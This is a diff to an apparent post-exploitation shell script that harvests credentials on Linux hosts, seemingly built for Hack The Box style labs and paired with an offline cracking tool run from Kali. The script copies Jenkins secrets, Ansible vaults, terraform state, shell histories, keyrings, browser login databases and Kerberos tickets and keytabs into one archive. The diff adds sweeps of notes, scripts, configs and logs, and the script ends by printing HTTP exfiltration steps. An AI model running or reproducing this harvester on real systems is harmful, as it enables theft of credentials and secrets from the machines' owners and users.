@@ -5,9 +5,8 @@
 # john, no internet needed). It copies every raw credential artifact it can
 # read into ONE archive, preserving paths, plus a meta/ report for things that
 # are not files (process env, ssh-agent, logged-in users). You then pull the
-# archive to Kali and run:  python3 nixdump.py --offline <archive>
+# archive to Kali and run:  python3 nixdump.py <archive>
 #
-# Collect everything raw here; parse/crack/decrypt offline where the tools are.
 # As always: you only get what your current privileges can read (root = all).
 
 set -u
@@ -141,7 +140,6 @@ cp_find "*.tfstate.backup" /opt /srv /home /root /var/lib
 cp_find "*.tfvars"    /opt /srv /home /root /var/lib
 
 # ================= CI / CONFIG-MGMT (apps.py) ===========================
-# jenkins secrets, ansible vaults, tomcat users - read by the apps collector
 cp_dir /var/lib/jenkins/secrets
 cp_find "credentials.xml" /var/lib/jenkins /var/jenkins_home
 cp_find "*.yml" /etc/ansible
@@ -171,12 +169,12 @@ for h in $HOMES; do
         cp_one "$h/$hist"
     done
     cp_one "$h/.local/share/fish/fish_history"
-    # shell rc / env (config_env.py) + user crontab + mysql/vnc (services.py)
+    # shell rc / env + user crontab + mysql/vnc
     for rc in .bashrc .bash_profile .zshrc .profile .bash_login .kshrc .cshrc \
               .mylogin.cnf .vnc/passwd .vnc/passwdfile; do
         cp_one "$h/$rc"
     done
-    # mail / git / mongo / ftp client stores (extra.py)
+    # mail / git / mongo / ftp client stores
     for e in .msmtprc .config/msmtp/config .muttrc .mutt/muttrc \
              .config/mutt/muttrc .neomuttrc .config/neomutt/neomuttrc \
              .fetchmailrc .config/fetchmail/fetchmailrc \
@@ -202,7 +200,7 @@ for h in $HOMES; do
     cp_dir "$h/.kde/share/apps/kwallet"
     cp_dir "$h/.local/share/kwalletd"
     cp_dir "$h/.password-store"
-    # firefox / thunderbird profiles (logins + key db only)
+    # firefox / thunderbird profiles
     for b in .mozilla/firefox .thunderbird; do
         [ -d "$h/$b" ] || continue
         for f in logins.json key4.db key3.db signons.sqlite; do
@@ -210,8 +208,7 @@ for h in $HOMES; do
                 while IFS= read -r ff; do cp_one "$ff"; done
         done
     done
-    # chromium-family profiles (saved logins db). Decrypt offline needs the
-    # keyring (grabbed above) or the basic-store "peanuts" key.
+    # chromium-family profiles
     for b in .config/google-chrome .config/chromium \
              ".config/BraveSoftware/Brave-Browser" .config/microsoft-edge \
              .config/vivaldi .config/opera \
@@ -229,6 +226,28 @@ done
 # ================= KERBEROS TICKETS / KEYTABS =================
 cp_find "krb5cc_*" /tmp /var/tmp /run
 cp_find "*.keytab" /etc /opt /home /root /var
+
+# ================= GENERIC SWEEPS (notes / scripts / configs / logs) =====
+# notes + extensionless (HTB: find /home/* -name '*.txt' -o ! -name '*.*')
+cp_find "*.txt" $HOMES
+for h in $HOMES; do
+    [ -d "$h" ] || continue
+    find "$h" -maxdepth 3 -type f ! -name "*.*" 2>/dev/null | \
+        while IFS= read -r f; do cp_one "$f"; done
+done
+
+# scripts (HTB: .py .pyc .pl .go .jar .c .sh)
+for pat in "*.py" "*.pyc" "*.pl" "*.go" "*.jar" "*.c" "*.sh"; do
+    cp_find "$pat" $HOMES /var/www /srv /opt
+done
+
+# generic config sweeps (HTB: .conf .config .cnf)
+for pat in "*.conf" "*.config" "*.cnf"; do
+    cp_find "$pat" /etc /opt /srv /var/www
+done
+
+# logs (HTB: /var/log/*)
+cp_dir /var/log
 
 # ================= META: PROCESS ENV + CMDLINE (not files) =================
 {
@@ -296,7 +315,7 @@ BN=$(basename "$OUT")
 log "done -> $OUT"
 cat <<EOF
 
-[*] EXFIL (pick one), then on kali:  python3 nixdump.py --offline $BN --crack --json
+[*] EXFIL (pick one), then on kali:  python3 nixdump.py $BN --crack --json
 
   A) http pull   target: python3 -m http.server 8001
                  kali:   wget http://<TARGET_OR_240.0.0.1>:8001/$BN
